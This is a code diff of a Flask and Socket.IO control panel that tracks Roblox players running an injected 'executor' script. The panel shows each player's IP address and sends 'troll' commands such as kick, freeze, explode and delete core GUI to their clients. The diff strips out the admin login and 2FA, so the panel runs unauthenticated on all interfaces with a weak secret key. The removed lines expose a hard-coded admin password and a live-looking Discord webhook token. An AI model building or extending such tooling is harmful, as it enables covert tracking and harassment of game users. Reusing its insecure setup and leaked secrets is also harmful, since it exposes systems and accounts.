@@ -1,48 +1,15 @@
-from flask import Flask, render_template_string, request, jsonify, redirect, url_for, session
-from flask_socketio import SocketIO
+from flask import Flask, render_template_string, request, jsonify
+from flask_socketio import SocketIO, emit
 import time
-import random
-import requests
 
-# ================= CONFIG =================
-ADMIN_USER = "entrepreneur"
-ADMIN_PASS = "E9#pX7@M2qL4"
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1450877345513869374/doOUmy_SaDuv-0AxJsYd68cYsdICizKB-VB8SgJd2UyrJLjQxFw2qxTMztSxLKXHqpw7"
-
-# ================= APP =================
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "super-secret-key"
+app.config["SECRET_KEY"] = "secret"
 socketio = SocketIO(app, cors_allowed_origins="*")
 
 connected_players = {}
 pending_kicks = {}
 pending_commands = {}
 
-# ================= LOGIN / 2FA HTML =================
-LOGIN_HTML = """
-<!DOCTYPE html>
-<html><body style="background:#000;color:#fff;font-family:Arial;text-align:center;margin-top:120px">
-<h2>Admin Login</h2>
-<form method="post">
-<input name="username" placeholder="Username" required><br><br>
-<input name="password" type="password" placeholder="Password" required><br><br>
-<button type="submit">Login</button>
-</form>
-</body></html>
-"""
-
-TWOFA_HTML = """
-<!DOCTYPE html>
-<html><body style="background:#000;color:#fff;font-family:Arial;text-align:center;margin-top:120px">
-<h2>2FA Verification</h2>
-<form method="post">
-<input name="code" placeholder="6-digit code" required><br><br>
-<button type="submit">Verify</button>
-</form>
-</body></html>
-"""
-
-# ================= PANEL HTML =================
 HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -142,43 +109,65 @@ function render(data) {
     const grid = document.getElementById("players");
     const stats = document.getElementById("stats");
     stats.innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
+    const currentIds = new Set(Object.keys(data.players));
+
+    Object.entries(data.players).forEach(([id, p]) => {
+        let card = document.getElementById(`card_${id}`);
+        if (!card) { card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card); }
+
+        card.innerHTML = `
+            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
+            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
+            <div class="info">
+                Executor: ${p.executor || "Unknown"}<br>
+                IP: ${p.ip || "Unknown"}
+            </div>
+
+            <div class="category">TROLLS</div>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+                <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal(${id})" ${!p.online?"disabled":""}>KICK</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="sendTroll(${id}, 'freeze')" ${!p.online?"disabled":""}>FREEZE</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="sendTroll(${id}, 'spin')" ${!p.online?"disabled":""}>SPIN</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#ffff00,#aaaa00);" onclick="sendTroll(${id}, 'jump')" ${!p.online?"disabled":""}>JUMP</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#88ff88,#55aa55);" onclick="sendTroll(${id}, 'rainbow')" ${!p.online?"disabled":""}>RAINBOW</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#ff5555,#aa0000);" onclick="sendTroll(${id}, 'explode')" ${!p.online?"disabled":""}>EXPLODE</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll(${id}, 'invisible')" ${!p.online?"disabled":""}>INVISIBLE</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#aa0000,#ff0000);" onclick="sendTroll(${id}, 'delete_coregui')" ${!p.online?"disabled":""}>DELETE CORE GUI</button>
+            </div>
+
+            <div class="category">UNDO</div>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+                <button class="kick-btn" style="background:#666;" onclick="sendTroll(${id}, 'unfreeze')" ${!p.online?"disabled":""}>UNFREEZE</button>
+                <button class="kick-btn" style="background:#666;" onclick="sendTroll(${id}, 'unspin')" ${!p.online?"disabled":""}>UNSPIN</button>
+                <button class="kick-btn" style="background:#666;" onclick="sendTroll(${id}, 'unrainbow')" ${!p.online?"disabled":""}>STOP RAINBOW</button>
+            </div>
+        `;
+    });
+
+    document.querySelectorAll('.card').forEach(card => {
+        if (!currentIds.has(card.id.replace('card_', ''))) card.remove();
+    });
+
+    if (firstRender) firstRender = false;
 }
+
+document.getElementById("cancelKick").onclick = () => closeModal(kickModal);
+document.getElementById("confirmKick").onclick = performKick;
+
+kickModal.onclick = (e) => { if (e.target === kickModal) closeModal(kickModal); };
+
 socket.on("update", render);
+socket.on("kick_notice", d => toast(`${d.username} → ${d.reason}`, "danger"));
+socket.on("status", d => toast(`${d.username} is now ${d.online ? "online" : "offline"}`));
 </script>
 </body>
 </html>
 """
 
-# ================= ROUTES =================
-@app.route("/login", methods=["GET", "POST"])
-def login():
-    if request.method == "POST":
-        if request.form["username"] == ADMIN_USER and request.form["password"] == ADMIN_PASS:
-            code = str(random.randint(100000, 999999))
-            session["2fa_code"] = code
-            session["username"] = ADMIN_USER
-            requests.post(DISCORD_WEBHOOK, json={"content": f"🔐 2FA CODE pour {ADMIN_USER}: {code}"})
-            return redirect(url_for("twofa"))
-    return LOGIN_HTML
-
-@app.route("/twofa", methods=["GET", "POST"])
-def twofa():
-    if "2fa_code" not in session:
-        return redirect("/login")
-    if request.method == "POST":
-        if request.form.get("code") == session["2fa_code"]:
-            session["auth"] = True
-            session.pop("2fa_code")
-            return redirect("/")
-    return TWOFA_HTML
-
 @app.route("/")
 def index():
-    if not session.get("auth"):
-        return redirect("/login")
     return render_template_string(HTML)
 
-# ================= API / KICK / TROLL =================
 @app.route("/api", methods=["GET", "POST"])
 def api():
     now = time.time()
@@ -192,7 +181,8 @@ def api():
                 "ip": d.get("ip", "Unknown"),
                 "last": now
             }
-        elif d["action"] == "heartbeat":
+            socketio.emit("status", {"username": connected_players[uid]["username"], "online": True})
+        elif d["action"] == "heartbeat" and uid in connected_players:
             connected_players[uid]["last"] = now
 
     if request.method == "GET":
@@ -224,7 +214,6 @@ def troll():
     socketio.emit("kick_notice", {"username": name, "reason": f"{cmd.upper()} sent"})
     return jsonify({"sent": True})
 
-# ================= BROADCAST =================
 def broadcast():
     while True:
         now = time.time()
@@ -241,9 +230,7 @@ def broadcast():
         socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
         socketio.sleep(2)
 
-# ================= START =================
 if __name__ == "__main__":
-    print(f"Server started → http://127.0.0.1:5000")
-    print(f"Login: {ADMIN_USER}, Password: {ADMIN_PASS}")
     socketio.start_background_task(broadcast)
+    print("Server started → http://127.0.0.1:5000")
     socketio.run(app, host="0.0.0.0", port=5000)
